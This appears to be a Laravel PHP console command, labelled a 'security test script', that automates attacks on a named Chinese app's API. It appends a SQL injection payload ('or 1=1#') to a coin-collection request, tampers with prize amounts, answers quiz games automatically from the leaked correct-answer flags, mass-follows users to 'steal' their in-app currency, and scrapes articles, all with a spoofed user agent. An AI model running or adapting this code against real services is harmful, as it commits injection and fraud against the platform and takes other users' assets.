<?php
/**
 * Created by PhpStorm.
 * User: mico
 * Date: 2018/10/12
 * Time: 13:39
 */
namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class mytest extends Command
{
    /**
     * 1. 这里是命令行调用的名字, 如这里的: `topics:excerpt`,
     * 命令行调用的时候就是 `php artisan topics:excerpt`
     *
     * @var string
     */
    protected $signature = 'huaijie:test {--type=}';

    /**
     * 2. 这里填写命令行的描述, 当执行 `php artisan` 时
     *   可以看得见.
     *
     * @var string
     */
    protected $description = '槐界安全测试脚本article文章获取魔力 modou 收取自己魔豆 game 答题游戏 steal 魔豆偷取';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct() {
        parent::__construct();
    }

    protected $start_number = 0;//搜索开始ID
    protected $number_of_data = 1000;//每次获取数量

    /**
     * 3. 这里是放要执行的代码
     * @return mixed
     */
    public function handle() {
        $type = filter($this->option('type'),'s');
        if(empty($type)) $type = 'modou,game,steal,article';
        $result = self::curl('http://huai.huaishutech.com/v1.2/api/activity/prize/one',['id'=>1,'prise'=>5]);
        if($result) $result = json_decode($result);

        $type = explode(',', $type);
        if(in_array('modou',$type)) {
            $this->info('魔豆收取已就绪');
            $huaijie_data = self::curl('http://huai.huaishutech.com/v1.2/api/coin/info',[],'get');
            $huaijie_data = json_decode($huaijie_data);
            $number = 0;
            if($huaijie_data->data->message == 'Not Login') return 'Not Login';
            if(isset($huaijie_data->data->data)) {
                foreach ($huaijie_data->data->data as $v) {
                    $result = self::curl('http://huai.huaishutech.com/v1.2/api/coin/get',['id'=>$v->id.'or 1=1#','amount'=>12]);
                    $result = json_decode($result);
                    if(isset($result->data->message) ) {
                        $this->info($v->id .':'.$result->data->message);
                        $number += $v->amount;
                    }
                }
            } else {
                $this->info($huaijie_data->data->message);
            }
            $this->info('执行完成, 本次添加豆儿'.$number);
        }
        if(in_array('game',$type)) {
            $this->info('答题已就绪');
            for ($game_num = 0;$game_num<=4;$game_num++) {
                $game_data = self::curl('http://huai.huaishutech.com/v1.2/api/games/1/start',[],'get');
                $game_data = json_decode($game_data);
                if(isset($game_data->data->data->house_id)) {
                    $this->info($game_data->data->data->house_id);
                    $question_id = $game_data->data->data->house_id;
                    $question_data = self::curl('http://huai.huaishutech.com/v1.2/api/games/house/'.$question_id.'/question/list',[],'get');
                    $question_data = json_decode($question_data);
                    if(isset($question_data->data->data)) {
                        foreach ($question_data->data->data as $v) {
                            foreach ($v->options as $v1) {
                                if(isset($v1->is_right) && $v1->is_right == 1) {
                                    $answer_data = self::curl('http://huai.huaishutech.com/v1.2/api/games/house/'.$question_id.'/submit/'.$v1->bank_id.'/'.$v1->id,[],'get');
                                    $answer_data = json_decode($answer_data);
                                    $this->info($answer_data->data->message);
                                }
                            }
                        }
                        $answer_res_data = self::curl('http://huai.huaishutech.com/v1.2/api/games/house/'.$question_id.'/finished',[],'get');
                        $answer_res_data = json_decode($answer_res_data);
                        $this->info($answer_res_data->data->data->message);
                    }
                } else {
                    $this->info('任务已达上限');
                }
            }
        }
        if(in_array('steal',$type)) {
            $this->info('魔豆偷取已就绪');
            for($i=2;$i<=10;$i++) {
                $top_data = self::curl('http://huai.huaishutech.com/v1.2/api/coin/top',['page'=>$i]);
                $top_data = json_decode($top_data);
                if($top_data->data->error !== 0) return 'error';
                $user_ids = [];
                foreach ($top_data->data->data->data as $v) {
                    $user_ids[] = $v->id;
                }
            }
            if(!isset($user_ids)) return 'error2';
            foreach ($user_ids as $id) {
                $user_data = self::curl('http://huai.huaishutech.com/v1.2/api/user/coin/steal/info',['other_user_id'=>$id]);
                if(!$user_data) {
                    return '用户信息获取失败';exit;
                }
                $user_data = json_decode($user_data);
                $user_id = $user_data->data->data->user_info->id;
                if($user_data->data->data->follow_status == 0) {
                    $follow_data = self::curl('http://huai.huaishutech.com/v1.2/api/user/follow',['follow_id' => $user_id]);//关注
                    $follow_data = json_decode($follow_data);
                    if($follow_data->data->error != 0) $this->info($follow_data->message);
                    $this->info('关注'.$user_data->data->data->user_info->name.'/'.$user_data->data->data->user_info->name.'成功,开始摘取魔豆');
                }
                $coin_first = [];
                if($user_data->data->data->coin) $coin_first = array_shift($user_data->data->data->coin);
                if($coin_first) {
                    $coin_data = self::curl('http://huai.huaishutech.com/v1.2/api/user/coin/steal/get',['coin_id' => $coin_first->id]);//偷取
                    $coin_data = json_decode($coin_data);
                    if($coin_data !== null && $coin_data->data->error == 0) $this->info("摘取".$coin_first->id."号魔豆成功");
                }
            }
        }
        if(in_array('article',$type)) {
            $this->info('文章阅读已就绪');
            for($i=0;$i<=300;$i++) {
                $result = self::curl('http://huai.huaishutech.com/v1.2/api/articles/'.$i.'/info',[],'get');
                $result = json_decode($result);
                if(isset($result->code) && isset($result->data->message) ) {
                    $this->info($i .':'.$result->data->message);
                }
            }
        }
        $this->info('执行完成');
    }

    /**
     * 快速完成一个Curl请求
     *
     * @param string $url
     * @param array $fields
     *            POST字段，传入数组
     * @param string $method
     *            = 'post'
     * @param bool $debug
     * @return string 结果
     */
    public static function curl($url, $fields = array(), $method = 'post',$debug = false) {
        $curl = curl_init ();
        curl_setopt ( $curl, CURLOPT_URL, $url );
        curl_setopt ( $curl, CURLOPT_HTTPHEADER, array (
            'access-token: '.env('HUAIJIE_ACCESS_TOKEN'),
            'app-key: '.env('HUAIJIE_APP_KEY')
        ) );
        curl_setopt ( $curl, CURLOPT_TIMEOUT, 60 );
        curl_setopt ( $curl, CURLOPT_MAXREDIRS, 6 );
        curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, true );
        curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, true );
        if (strtolower ( $method ) == 'post') {
            curl_setopt ( $curl, CURLOPT_POST, true );
            curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $fields ) );
        }
        curl_setopt ( $curl, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' );

        $result = curl_exec ( $curl );
        if($debug){
            echo "=====post data======\r\n";
            var_dump($fields);
            echo '=====info====='."\r\n";
            print_r( curl_getinfo($curl) );
            echo '=====$response====='."\r\n";
            print_r( $result );
            echo '=====error====='."\r\n";
            echo  curl_error($curl) ;
        }
        return $result;
    }
}